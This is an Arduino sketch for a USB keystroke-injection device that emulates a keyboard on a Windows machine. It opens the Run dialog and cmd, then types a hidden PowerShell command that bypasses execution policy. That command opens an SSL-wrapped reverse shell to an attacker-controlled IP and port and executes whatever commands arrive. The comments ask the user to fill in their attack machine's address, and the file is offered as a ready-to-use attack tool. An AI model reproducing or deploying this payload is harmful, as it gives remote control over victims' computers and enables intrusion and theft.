#include <Keyboard.h>


void setup() {
    Keyboard.begin(); // starting emulating the keyboard
}

void loop() {
    delay(500);
    Keyboard.press(KEY_LEFT_GUI); // the win + r shortcut 
    Keyboard.press("r");
    Keyboard.releaseAll();
    delay(100);
    Keyboard.print("cmd"); // opening cmd 
    Keyboard.press(KEY_RETURN);
    delay(1500);
    Keyboard.release(KEY_RETURN);
    delay(1500); // we wait for the cmd to open 
    // a reverse shell using powershell
    // edit the IP and PORT parameters to your machine (ATTACK MACHINE)
    Keyboard.print("powershell -nop -W hidden -noni -ep bypass -c \"$TCPClient = New-Object Net.Sockets.TCPClient('10.10.10.16', 4444);$NetworkStream = $TCPClient.GetStream();$SslStream = New-Object Net.Security.SslStream($NetworkStream,$false,({$true} -as [Net.Security.RemoteCertificateValidationCallback]));$SslStream.AuthenticateAsClient('cloudflare-dns.com',$null,$false);if(!$SslStream.IsEncrypted -or !$SslStream.IsSigned) {$SslStream.Close();exit}$StreamWriter = New-Object IO.StreamWriter($SslStream);function WriteToStream ($String) {[byte[]]$script:Buffer = 0..$TCPClient.ReceiveBufferSize | % {0};$StreamWriter.Write($String + 'SHELL> ');$StreamWriter.Flush()};WriteToStream '';while(($BytesRead = $SslStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) {$Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1);$Output = try {Invoke-Expression $Command 2>&1 | Out-String} catch {$_ | Out-String}WriteToStream ($Output)}$StreamWriter.Close()\"");
    Keyboard.press(KEY_RETURN);
    delay(500);
    Keyboard.release(KEY_RETURN);
    delay(500); 
}


  
